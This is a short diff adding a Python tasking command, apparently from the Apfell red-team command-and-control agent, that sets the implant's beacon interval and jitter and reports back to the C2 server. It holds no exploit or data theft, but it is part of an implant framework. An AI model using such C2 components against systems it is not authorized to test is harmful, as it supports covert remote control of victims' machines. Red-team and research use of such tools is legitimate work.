@@ -1,0 +1,17 @@
+def sleep_time(apfell, c2, params="whoami", task_id=-1):
+    try:
+        import json
+    except Exception as e:
+        c2.post_response(response="Failed to import modules", task_id=task_id)
+        apfell.remove_job(task_id)
+        return
+    try:
+        param_pieces = json.loads(params)
+        c2.interval = abs(param_pieces['interval']) if 'interval' in param_pieces and param_pieces['interval'] != -1 else c2.interval
+        c2.jitter = abs(param_pieces['jitter']) if 'jitter' in param_pieces and param_pieces['jitter'] != -1 else c2.jitter
+        c2.post_response(response="Updated interval ({}) and jitter ({})".format(str(c2.interval), str(c2.jitter)), task_id=task_id)
+    except Exception as e:
+        c2.post_response(response="Failed to update sleep time: {}".format(str(e)), task_id=task_id)
+    apfell.remove_job(task_id) # need to do this to remove your task from the list
+
+COMMAND_ENDS_HERE
